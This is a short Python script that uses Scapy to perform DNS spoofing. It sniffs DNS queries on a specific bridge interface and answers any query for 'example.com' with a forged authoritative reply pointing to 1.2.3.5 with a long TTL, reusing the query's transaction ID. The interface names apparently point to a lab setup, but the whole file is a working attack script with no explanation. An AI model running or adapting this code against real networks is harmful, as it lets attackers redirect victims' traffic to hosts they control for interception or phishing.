from scapy.all import *
import sys

def spoof_dns(pkt):
    if (DNS in pkt and pkt[DNS].qr == 0 and 'example.com' in pkt[DNS].qd.qname.decode('utf-8') and pkt[UDP].sport != 53):
        if IP in pkt and UDP in pkt:
            old_ip = pkt[IP]
            old_udp = pkt[UDP]
            old_dns = pkt[DNS]

            ip = IP(dst=old_ip.src,
                    src=old_ip.dst)

            udp = UDP(dport=old_udp.sport,
                      sport=53)

            Anssec = DNSRR(rrname=old_dns.qd.qname,
                           type='A',
                           rdata='1.2.3.5',
                           ttl=259200)

            dns = DNS(id=old_dns.id,
                      aa=1, qr=1, qdcount=1, ancount=1,
                      qd=old_dns.qd,
                      an=Anssec)

            spoofpkt = ip/udp/dns
            send(spoofpkt, verbose=True)
        else:
            print("Packet does not have IP or UDP layer.")
    else:
        pass  # Packet does not meet criteria

pkt = sniff(iface='br-6c61ca3eb7ac', filter='udp port 53 and not udp src port 53', prn=spoof_dns) # Host
# pkt = sniff(iface='br-36b63c49735d', filter='udp port 53 and not udp src port 53', prn=spoof_dns) # Server
